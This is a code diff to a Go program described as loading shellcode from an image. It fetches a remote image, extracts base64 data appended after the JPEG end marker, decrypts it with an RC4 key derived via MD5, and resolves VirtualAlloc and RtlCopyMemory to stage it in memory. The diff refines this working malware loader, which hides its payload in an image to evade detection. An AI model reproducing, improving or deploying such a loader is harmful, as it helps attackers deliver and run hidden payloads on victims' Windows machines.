@@ -4,7 +4,7 @@
 //require: None
 //Description: load shellcode from img
 //E-mail: gality365@gmail.com
-
+// fix by yumusb
 package main
 
 import (
@@ -15,6 +15,10 @@ import (
 	"crypto/rc4"
 	"syscall"
 	"unsafe"
+	"crypto/md5"
+	"encoding/hex"
+	"bytes"
+	//"fmt"
 )
 
 const (
@@ -31,11 +35,16 @@ var (
 	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
-
+func md5V(str string) string  {
+    h := md5.New()
+    h.Write([]byte(str))
+    return hex.EncodeToString(h.Sum(nil))
+}
 func main()  {
 	imageURL := "...your img url..."
-	rc4Key := []byte("...your RC4 key...")
-
+	rc4KeyPlain := "...your RC4 key..."
+	
+	rc4Key := []byte(md5V(rc4KeyPlain))
 	resp, err := http.Get(imageURL)
 	if err != nil {
 		os.Exit(1)
@@ -45,16 +54,14 @@ func main()  {
 	if err != nil {
 		os.Exit(1)
 	}
-	idx := 0
-	b = []byte(b)
-	for i := 0; i < len(b); i++ {
-		if b[i] == 255 && b[i+1] == 217 {
-			break
-		}
-		idx++
+	//直接以ffd9做split，得到shellcode
+	c := bytes.Split(b,[]byte{255,217})
+	if len(c) != 2 {
+		os.Exit(1)
+		//"error load img"
 	}
-	raw := string(b[idx+2:])
-	// fmt.Print(raw)
+	raw := string(c[1])
+	//fmt.Print(raw)
 	sDec, _ := b64.StdEncoding.DecodeString(raw)
 	cipher, _ := rc4.NewCipher(rc4Key)
 	cipher.XORKeyStream(sDec, sDec)
